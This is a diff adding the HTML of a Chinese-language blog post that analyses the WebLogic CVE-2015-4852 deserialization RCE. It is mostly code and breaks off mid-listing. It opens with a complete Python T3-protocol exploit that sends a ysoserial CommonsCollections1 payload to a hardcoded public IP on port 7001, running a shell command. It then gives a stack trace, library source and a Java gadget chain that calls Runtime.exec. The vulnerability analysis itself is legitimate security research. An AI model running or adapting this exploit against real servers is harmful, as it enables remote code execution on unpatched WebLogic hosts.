@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="12345678910111213141516171819202122232425262728293031323334353637383940from os import popenimport struct # 负责大小端的转换import subprocessfrom sys import stdoutimport socketimport reimport binasciidef gener">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Weblogic CVE-2015-4852 反序列化RCE分析">
+<meta property="og:url" content="https://blog.b1ank.top/2021/08/20/weblogic/index.html">
+<meta property="og:site_name" content="b1ank&#39;s blog">
+<meta property="og:description" content="12345678910111213141516171819202122232425262728293031323334353637383940from os import popenimport struct # 负责大小端的转换import subprocessfrom sys import stdoutimport socketimport reimport binasciidef gener">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-08-19T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-08-20T13:15:11.613Z">
+<meta property="article:author" content="b1ank">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Weblogic CVE-2015-4852 反序列化RCE分析</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/b1ank1108">Projects</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post " href="/2021/03/05/auth/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.b1ank.top/2021/08/20/weblogic/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.b1ank.top/2021/08/20/weblogic/&text=Weblogic CVE-2015-4852 反序列化RCE分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.b1ank.top/2021/08/20/weblogic/&title=Weblogic CVE-2015-4852 反序列化RCE分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.b1ank.top/2021/08/20/weblogic/&is_video=false&description=Weblogic CVE-2015-4852 反序列化RCE分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Weblogic CVE-2015-4852 反序列化RCE分析&body=Check out this article: https://blog.b1ank.top/2021/08/20/weblogic/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.b1ank.top/2021/08/20/weblogic/&title=Weblogic CVE-2015-4852 反序列化RCE分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.b1ank.top/2021/08/20/weblogic/&title=Weblogic CVE-2015-4852 反序列化RCE分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.b1ank.top/2021/08/20/weblogic/&title=Weblogic CVE-2015-4852 反序列化RCE分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.b1ank.top/2021/08/20/weblogic/&title=Weblogic CVE-2015-4852 反序列化RCE分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.b1ank.top/2021/08/20/weblogic/&name=Weblogic CVE-2015-4852 反序列化RCE分析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.b1ank.top/2021/08/20/weblogic/&t=Weblogic CVE-2015-4852 反序列化RCE分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#LazyMap"><span class="toc-number">1.</span> <span class="toc-text">LazyMap</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Weblogic CVE-2015-4852 反序列化RCE分析
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">b1ank</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-08-19T16:00:00.000Z" itemprop="datePublished">2021-08-20</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> popen</span><br><span class="line"><span class="keyword">import</span> struct <span class="comment"># 负责大小端的转换</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> stdout</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generatePayload</span>(<span class="params">gadget,cmd</span>):</span></span><br><span class="line">    YSO_PATH = <span class="string">&quot;ysoserial.jar&quot;</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>,<span class="string">&#x27;-jar&#x27;</span>,YSO_PATH,gadget,cmd],stdout=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">return</span> popen.stdout.read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">T3Exploit</span>(<span class="params">ip,port,payload</span>):</span></span><br><span class="line">    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((ip,port))</span><br><span class="line">    handshake = <span class="string">&quot;t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n&quot;</span></span><br><span class="line">    sock.sendall(handshake.encode())</span><br><span class="line">    data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">compile</span> = re.<span class="built_in">compile</span>(<span class="string">&quot;HELO:(.*).0.false&quot;</span>)</span><br><span class="line">    match = <span class="built_in">compile</span>.findall(data.decode())</span><br><span class="line">    <span class="keyword">if</span> match:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Weblogic: &quot;</span>+<span class="string">&quot;&quot;</span>.join(match))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Not Weblogic&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    header = binascii.a2b_hex(<span class="string">b&quot;00000000&quot;</span>)</span><br><span class="line">    t3header = binascii.a2b_hex(<span class="string">b&quot;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&quot;</span>)</span><br><span class="line">    desflag = binascii.a2b_hex(<span class="string">b&quot;fe010000&quot;</span>)</span><br><span class="line">    payload = header + t3header  +desflag+  payload</span><br><span class="line">    payload = struct.pack(<span class="string">&quot;&gt;I&quot;</span>,<span class="built_in">len</span>(payload)) + payload[<span class="number">4</span>:]</span><br><span class="line"></span><br><span class="line">    sock.send(payload)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ip = <span class="string">&quot;39.107.123.139&quot;</span></span><br><span class="line">    port = <span class="number">7001</span></span><br><span class="line">    gadget = <span class="string">&quot;CommonsCollections1&quot;</span></span><br><span class="line">    cmd = <span class="string">&quot;touch /tmp/success&quot;</span></span><br><span class="line">    payload = generatePayload(gadget,cmd)</span><br><span class="line">    T3Exploit(ip,port,payload)</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">transform:123, InvokerTransformer (org.apache.commons.collections.functors)</span><br><span class="line">transform:122, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:157, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">invoke:69, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">entrySet:-1, $Proxy89 (com.sun.proxy)</span><br><span class="line">readObject:346, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">invoke:-1, GeneratedMethodAccessor87 (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:601, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:1004, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:1891, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:1796, ObjectInputStream (java.io)</span><br><span class="line">readObject0:1348, ObjectInputStream (java.io)</span><br><span class="line">readObject:370, ObjectInputStream (java.io)</span><br><span class="line">readObject:66, InboundMsgAbbrev (weblogic.rjvm)</span><br><span class="line">read:38, InboundMsgAbbrev (weblogic.rjvm)</span><br><span class="line">readMsgAbbrevs:283, MsgAbbrevJVMConnection (weblogic.rjvm)</span><br><span class="line">init:213, MsgAbbrevInputStream (weblogic.rjvm)</span><br><span class="line">dispatch:498, MsgAbbrevJVMConnection (weblogic.rjvm)</span><br><span class="line">dispatch:330, MuxableSocketT3 (weblogic.rjvm.t3)</span><br><span class="line">dispatch:387, BaseAbstractMuxableSocket (weblogic.socket)</span><br><span class="line">readReadySocketOnce:967, SocketMuxer (weblogic.socket)</span><br><span class="line">readReadySocket:899, SocketMuxer (weblogic.socket)</span><br><span class="line">processSockets:130, PosixSocketMuxer (weblogic.socket)</span><br><span class="line">run:29, SocketReaderRequest (weblogic.socket)</span><br><span class="line">execute:42, SocketReaderRequest (weblogic.socket)</span><br><span class="line">execute:145, ExecuteThread (weblogic.kernel)</span><br><span class="line">run:117, ExecuteThread (weblogic.kernel)</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">    <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">    <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class cls = input.getClass();</span><br><span class="line">            Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="keyword">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="keyword">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException var7) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="keyword">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, var7);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">testExec</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] trans_chain = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer chain = <span class="keyword">new</span> ChainedTransformer(trans_chain);</span><br><span class="line">        HashMap innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map outMap = TransformedMap.decorate(innerMap,<span class="keyword">null</span>,chain);</span><br><span class="line">        outMap.put(<span class="string">&quot;c&quot;</span>,<span class="string">&quot;d&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">        Object value = <span class="keyword">this</span>.factory.transform(key);</span><br><span class="line">        <span class="keyword">super</span>.map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="title">LazyMap</span><span class="params">(Map map, Transformer factory)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(map);</span><br><span class="line">    <span class="keyword">if</span> (factory == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.factory = factory;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object var1, Method var2, Object[] var3)</span> </span>&#123;</span><br><span class="line">    String var4 = var2.getName();</span><br><span class="line">    Class[] var5 = var2.getParameterTypes();</span><br><span class="line">    <span class="keyword">if</span> (var4.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; var5.length == <span class="number">1</span> &amp;&amp; var5[<span class="number">0</span>] == Object.class) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.equalsImpl(var3[<span class="number">0</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">assert</span> var5.length == <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (var4.equals(<span class="string">&quot;toString&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.toStringImpl();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var4.equals(<span class="string">&quot;hashCode&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.hashCodeImpl();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var4.equals(<span class="string">&quot;annotationType&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.type;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Object var6 = <span class="keyword">this</span>.memberValues.get(var4);</span><br><span class="line">            <span class="keyword">if</span> (var6 == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IncompleteAnnotationException(<span class="keyword">this</span>.type, var4);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var6 <span class="keyword">instanceof</span> ExceptionProxy) &#123;</span><br><span class="line">                <span class="keyword">throw</span> ((ExceptionProxy)var6).generateException();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (var6.getClass().isArray() &amp;&amp; Array.getLength(var6) != <span class="number">0</span>) &#123;</span><br><span class="line">                    var6 = <span class="keyword">this</span>.cloneArray(var6);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> var6;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>每一个动态代理类都必须要实现InvocationHandler这个接口，并且每个代理类的实例都关联到了一个handler，当代理类对象调用一个方法的时候，这个方法的调用就会被转发为由InvocationHandler这个接口的 invoke ()方法来进行调用。<br><a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2019/02/01/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E6%9C%BA%E5%88%B6/#InvocationHandler%E6%8E%A5%E5%8F%A3">https://www.mi1k7ea.com/2019/02/01/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E6%9C%BA%E5%88%B6/#InvocationHandler%E6%8E%A5%E5%8F%A3</a></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> 